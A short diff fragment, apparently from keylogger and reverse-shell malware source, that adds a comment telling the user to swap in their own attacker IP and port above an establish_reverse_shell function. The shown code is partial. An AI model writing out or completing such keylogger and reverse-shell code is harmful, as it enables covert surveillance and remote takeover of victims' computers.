@@ -42,6 +42,7 @@ def start_keylogger():
     # Start the keylogger
     keyboard.on_release(callback=callback)
 
+# Change the attacker port and ip address with your host machine ip address
 def establish_reverse_shell():
     # Attacker's IP address and port
     attacker_ip = "x.x.x.x"
